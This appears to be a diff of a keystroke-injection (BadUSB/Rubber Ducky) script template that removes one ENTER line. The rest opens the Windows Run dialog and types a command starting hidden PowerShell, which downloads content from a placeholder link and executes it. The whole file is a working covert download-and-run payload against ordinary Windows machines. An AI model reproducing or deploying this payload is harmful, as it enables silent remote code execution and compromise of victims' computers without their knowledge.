@@ -1,6 +1,5 @@
 DELAY {delay}
 GUI r
-ENTER
 DELAY 300
 STRING cmd /c start /min powershell -w hidden "$c=(& curl {link}).content; & $c;"
 ENTER
